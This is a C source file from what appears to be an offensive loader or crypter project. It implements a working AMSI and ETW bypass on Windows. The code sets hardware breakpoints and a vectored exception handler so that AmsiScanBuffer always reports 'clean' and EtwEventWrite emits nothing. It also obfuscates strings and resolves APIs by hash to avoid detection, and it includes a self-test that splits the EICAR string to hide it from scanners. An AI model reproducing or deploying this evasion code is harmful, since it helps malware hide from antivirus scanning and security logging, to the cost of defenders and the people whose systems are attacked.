/*
 * etw.c — Hardware-breakpoint ETW + AMSI bypass (24H2-safe)
 *
 * Why HWBP instead of inline byte-patching: on Win11 24H2 the Control
 * Flow Guard / dynamic-code mitigations will crash the process when
 * you flip ntdll/amsi.dll code pages to RW and write a jmp into the
 * function prologue. HWBP leaves the code pages untouched — the
 * breakpoint lives in the per-thread DR0–DR3 debug registers and
 * fires a #DB exception that we catch in a Vectored Exception Handler.
 *
 * Mechanism:
 *   1. Resolve target function address by DJB2 hash from its module.
 *   2. Install a shared VEH (RtlAddVectoredExceptionHandler) that
 *      watches for EXCEPTION_SINGLE_STEP and checks Rip against the
 *      tracked targets.
 *   3. Load the function address into DRn, enable local slot in DR7
 *      (type=exec, len=1), and push the updated CONTEXT via
 *      NtSetContextThread through the halos trampoline.
 *   4. When the hooked function is called, Windows raises #DB BEFORE
 *      the first instruction runs. Our VEH sets RAX to a success value,
 *      pops the return address off the stack into Rip, bumps Rsp by 8,
 *      and returns EXCEPTION_CONTINUE_EXECUTION. The function never
 *      executes — the caller sees a clean return.
 *
 * Per-thread caveat: DR registers are thread-local. This installs on
 * the CURRENT thread only (good enough for loader-internal AMSI/ETW).
 * Patching a remote process's AMSI/ETW requires setting the DR context
 * on that process's threads + planting a VEH over there — a separate
 * primitive, not done here.
 *
 * Layout preserved: etw_patch() and amsi_patch() still have the same
 * signatures so aes-main.c doesn't need to change beyond re-enabling
 * the calls.
 */

#include "etw.h"
#include "peb.h"
#include "halos.h"
#include "obfuscation.h"

/* amsi.dll (ASCII, 6-byte rolling XOR) — used for LoadLibraryA path */
static const uint8_t _enc_key_amsi[6] = { 0xed, 0x72, 0xed, 0x1a, 0x9a, 0x13 };
static const uint8_t _enc_amsidll[] = {
    0x8c, 0x1f, 0x9e, 0x73, 0xb4, 0x77, 0x81, 0x1e
};

/* amsi.dll (wide UTF-16LE, 6-byte rolling XOR) — for peb_get_module() */
static const uint8_t _enc_key_amsi_w[6] = { 0x7a, 0x4e, 0xb3, 0xd1, 0x5f, 0x28 };
static const uint8_t _enc_amsidll_w[]   = {
    0x1b, 0x4e, 0xde, 0xd1, 0x2c, 0x28, 0x13, 0x4e,
    0x9d, 0xd1, 0x3b, 0x28, 0x16, 0x4e, 0xdf, 0xd1
};

#ifndef STATUS_SINGLE_STEP
#define STATUS_SINGLE_STEP ((DWORD)0x80000004L)
#endif

/* ---- Breakpoint target table (shared with VEH) ---- */
static DWORD64 g_bp_amsi_scan = 0;
static DWORD64 g_bp_etw_write = 0;
static PVOID   g_veh_handle   = NULL;

typedef PVOID (WINAPI *AddVEH_t)(ULONG, PVECTORED_EXCEPTION_HANDLER);
typedef HMODULE (WINAPI *LoadLibraryA_t)(LPCSTR);

/* ---- The VEH ----
 * Fires on EXCEPTION_SINGLE_STEP. If the trap RIP matches a tracked
 * hook address, we do the function's "clean" return and continue. */
static LONG WINAPI hwbp_veh(PEXCEPTION_POINTERS info)
{
    if (info->ExceptionRecord->ExceptionCode != STATUS_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;

    DWORD64 rip = info->ContextRecord->Rip;

    /* AmsiScanBuffer(HAMSICONTEXT, PVOID buf, ULONG len, LPCWSTR name,
     *                HAMSISESSION, AMSI_RESULT *result)
     * Win64 ABI: RCX, RDX, R8, R9 are args 1–4; args 5+ at [rsp+0x28],
     * [rsp+0x30]. The *result out-param carries the verdict — we set it
     * to AMSI_RESULT_CLEAN (0) and the HRESULT in RAX to S_OK (0). */
    if (g_bp_amsi_scan && rip == g_bp_amsi_scan) {
        DWORD64 result_addr = *(DWORD64 *)(info->ContextRecord->Rsp + 0x30);
        if (result_addr) *(int *)(ULONG_PTR)result_addr = 0; /* AMSI_RESULT_CLEAN */
        info->ContextRecord->Rax = 0; /* S_OK */
        /* Synthesize a RET: pop return addr, bump Rsp. */
        info->ContextRecord->Rip = *(DWORD64 *)(info->ContextRecord->Rsp);
        info->ContextRecord->Rsp += 8;
        info->ContextRecord->Dr6 = 0;
        info->ContextRecord->EFlags |= 0x10000; /* RF — resume flag */
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    /* EtwEventWrite returns ULONG; 0 == success == event-not-emitted. */
    if (g_bp_etw_write && rip == g_bp_etw_write) {
        info->ContextRecord->Rax = 0;
        info->ContextRecord->Rip = *(DWORD64 *)(info->ContextRecord->Rsp);
        info->ContextRecord->Rsp += 8;
        info->ContextRecord->Dr6 = 0;
        info->ContextRecord->EFlags |= 0x10000;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

/* ---- Install the shared VEH exactly once ---- */
static BOOL install_veh_once(void)
{
    if (g_veh_handle) return TRUE;
    HMODULE ntdll = peb_get_ntdll();
    if (!ntdll) return FALSE;
    FARPROC pAddVEH = peb_find_export(ntdll, HASH_RtlAddVectoredExceptionHandler);
    if (!pAddVEH) return FALSE;
    g_veh_handle = ((AddVEH_t)pAddVEH)(1, hwbp_veh);
    return g_veh_handle != NULL;
}

/* ---- Arm a DRn slot on the current thread ----
 * slot: 0..3 (DR0..DR3). Type=exec, len=1 — the only HWBP kind that
 * works for instruction-fetch triggers. */
static BOOL hwbp_arm_current(int slot, DWORD64 addr)
{
    if (slot < 0 || slot > 3) return FALSE;

    CONTEXT ctx;
    ZeroMemory(&ctx, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    /* GetCurrentThread pseudohandle is (HANDLE)(-2); kernel accepts it
     * directly, so no API call needed. */
    HANDLE hThr = (HANDLE)(LONG_PTR)(-2);

    LONG status = halos_invoke_hash(HASH_NtGetContextThread,
                                    hThr, &ctx,
                                    NULL, NULL, NULL, NULL);
    if (status < 0) return FALSE;

    switch (slot) {
        case 0: ctx.Dr0 = addr; ctx.Dr7 |= (DWORD64)1 << 0; break;
        case 1: ctx.Dr1 = addr; ctx.Dr7 |= (DWORD64)1 << 2; break;
        case 2: ctx.Dr2 = addr; ctx.Dr7 |= (DWORD64)1 << 4; break;
        case 3: ctx.Dr3 = addr; ctx.Dr7 |= (DWORD64)1 << 6; break;
    }
    /* Type=exec (00), len=1 (00): clear 4 bits at 16+slot*4. */
    DWORD64 shift = 16 + (DWORD64)slot * 4;
    ctx.Dr7 &= ~((DWORD64)0xF << shift);

    status = halos_invoke_hash(HASH_NtSetContextThread,
                               hThr, &ctx,
                               NULL, NULL, NULL, NULL);
    return status >= 0;
}

/* ================================================================== */
/* ETW ============================================================== */
/* ================================================================== */
void etw_patch(void)
{
    if (!install_veh_once()) {
        DBG_PRINTF("[etw] VEH install failed\n");
        return;
    }
    HMODULE ntdll = peb_get_ntdll();
    if (!ntdll) return;

    FARPROC fn = peb_find_export(ntdll, HASH_EtwEventWrite);
    if (!fn) {
        DBG_PRINTF("[etw] EtwEventWrite export not found\n");
        return;
    }
    g_bp_etw_write = (DWORD64)(ULONG_PTR)fn;
    if (!hwbp_arm_current(1, g_bp_etw_write)) {
        DBG_PRINTF("[etw] DR1 arm failed for EtwEventWrite\n");
        g_bp_etw_write = 0;
        return;
    }
    DBG_PRINTF("[etw] HWBP armed on EtwEventWrite @ %p (DR1)\n",
               (void *)(ULONG_PTR)g_bp_etw_write);
}

/* ================================================================== */
/* AMSI ============================================================= */
/* ================================================================== */
void amsi_patch(void)
{
    if (!install_veh_once()) {
        DBG_PRINTF("[amsi] VEH install failed\n");
        return;
    }
    FARPROC pLoadLibraryA = peb_resolve_kernel32(HASH_LoadLibraryA);
    if (!pLoadLibraryA) {
        DBG_PRINTF("[amsi] LoadLibraryA not resolved\n");
        return;
    }
    char dllname[9];
    xor_dec_mb(dllname, _enc_amsidll, 8, _enc_key_amsi, 6);
    HMODULE hAmsi = ((LoadLibraryA_t)pLoadLibraryA)((LPCSTR)dllname);
    secure_zero(dllname, sizeof(dllname));
    if (!hAmsi) {
        DBG_PRINTF("[amsi] LoadLibraryA(amsi.dll) failed\n");
        return;
    }
    FARPROC fn = peb_find_export(hAmsi, HASH_AmsiScanBuffer);
    if (!fn) {
        DBG_PRINTF("[amsi] AmsiScanBuffer export not found\n");
        return;
    }
    g_bp_amsi_scan = (DWORD64)(ULONG_PTR)fn;
    if (!hwbp_arm_current(0, g_bp_amsi_scan)) {
        DBG_PRINTF("[amsi] DR0 arm failed for AmsiScanBuffer\n");
        g_bp_amsi_scan = 0;
        return;
    }
    DBG_PRINTF("[amsi] HWBP armed on AmsiScanBuffer @ %p (DR0)\n",
               (void *)(ULONG_PTR)g_bp_amsi_scan);
}

/* ================================================================== */
/* AMSI self-test — feed AmsiScanBuffer the EICAR string and print the
 * verdict. If bypass works, result == 0 (AMSI_RESULT_CLEAN) regardless
 * of input. If it doesn't, Defender tags EICAR → >= 32768 (DETECTED). */
/* ================================================================== */
void amsi_selftest(void)
{
    wchar_t amsi_w[9];
    xor_dec_w_mb(amsi_w, _enc_amsidll_w, 8, _enc_key_amsi_w, 6);
    HMODULE hAmsi = peb_get_module(amsi_w);
    secure_zero(amsi_w, sizeof(amsi_w));
    if (!hAmsi) { DBG_PRINTF("[amsi-test] amsi.dll not loaded\n"); return; }

    typedef HRESULT (WINAPI *AmsiInit_t)(LPCWSTR, HANDLE *);
    typedef HRESULT (WINAPI *AmsiOpenSession_t)(HANDLE, HANDLE *);
    typedef HRESULT (WINAPI *AmsiCloseSession_t)(HANDLE, HANDLE);
    typedef HRESULT (WINAPI *AmsiScanBuffer_t)(HANDLE, PVOID, ULONG,
                                              LPCWSTR, HANDLE, int *);

    AmsiInit_t pInit = (AmsiInit_t)peb_find_export(hAmsi, HASH_AmsiInitialize);
    AmsiOpenSession_t pOpen = (AmsiOpenSession_t)peb_find_export(hAmsi, HASH_AmsiOpenSession);
    AmsiCloseSession_t pClose = (AmsiCloseSession_t)peb_find_export(hAmsi, HASH_AmsiCloseSession);
    AmsiScanBuffer_t pScan = (AmsiScanBuffer_t)peb_find_export(hAmsi, HASH_AmsiScanBuffer);
    if (!pInit || !pScan) {
        DBG_PRINTF("[amsi-test] AMSI funcs not resolved (init=%p scan=%p)\n", pInit, pScan);
        return;
    }
    HANDLE ctx = NULL;
    HRESULT hr = pInit(L"darkcrypt-test", &ctx);
    if (hr != 0 || !ctx) {
        DBG_PRINTF("[amsi-test] AmsiInitialize failed hr=0x%lx\n", (unsigned long)hr);
        return;
    }
    HANDLE sess = NULL;
    if (pOpen) pOpen(ctx, &sess);

    /* EICAR test string, byte-split so the literal isn't in .rdata verbatim */
    char eicar[80];
    const char a[] = "X5O!P%@AP[4\\PZX54(P^)";
    const char b[] = "7CC)7}$EICAR-STANDARD";
    const char c[] = "-ANTIVIRUS-TEST-FILE!$H+H*";
    int off = 0;
    for (int i = 0; a[i]; i++) eicar[off++] = a[i];
    for (int i = 0; b[i]; i++) eicar[off++] = b[i];
    for (int i = 0; c[i]; i++) eicar[off++] = c[i];
    eicar[off] = 0;

    int result = -1;
    hr = pScan(ctx, (PVOID)eicar, (ULONG)off, L"darkcrypt-eicar", sess, &result);
    DBG_PRINTF("[amsi-test] AmsiScanBuffer(EICAR) hr=0x%lx result=%d "
               "(0=CLEAN, >=32768=DETECTED)\n",
               (unsigned long)hr, result);
    secure_zero(eicar, sizeof(eicar));
    if (pClose && sess) pClose(ctx, sess);
}
